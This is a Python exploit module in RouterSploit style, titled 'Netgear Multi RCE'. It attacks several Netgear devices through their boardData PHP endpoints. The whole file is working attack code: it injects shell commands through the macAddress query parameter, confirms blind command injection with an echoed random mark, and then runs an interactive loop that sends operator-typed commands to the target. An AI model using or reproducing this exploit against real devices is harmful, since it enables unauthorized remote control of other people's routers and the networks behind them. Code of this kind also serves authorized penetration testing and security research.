# rsf exploit module
# title: Netgear Multi RCE
# description: Exploits RCE in multiple Netgear devices.
# author: ediop3

import requests
import random
import string

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.arch = "mipsbe"
        self.resources = ['boardData102.php', 'boardData103.php', 'boardDataNA.php', 'boardDataWW.php', 'boardDataJP.php']
        self.valid_resource = None
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print("[*] Invoking command loop...")
            print("[*] It is blind command injection - response is not available")
            self.shell()
        else:
            print("[-] Target is not vulnerable")

    def execute(self, cmd):
        if not self.valid_resource:
            return ""
            
        path = f"/{self.valid_resource}?writeData=true&reginfo=0&macAddress=001122334455 -c 0 ;{cmd}; echo #"
        try:
            self.session.get(f"http://{self.target}:{self.port}{path}", timeout=5)
        except:
            pass
        return ""

    def check(self):
        mark = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        cmd = f"echo {mark}"

        for resource in self.resources:
            path = f"/{resource}?writeData=true&reginfo=0&macAddress=001122334455 -c 0 ;{cmd}; echo #"
            try:
                response = self.session.get(f"http://{self.target}:{self.port}{path}", timeout=5)
                if response and response.status_code == 200:
                    if "Update Success!" in response.text and mark in response.text:
                        self.valid_resource = resource
                        return True
            except:
                continue
        return False

    def shell(self):
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() in ["exit", "quit"]:
                    break
                self.execute(cmd)
            except KeyboardInterrupt:
                break
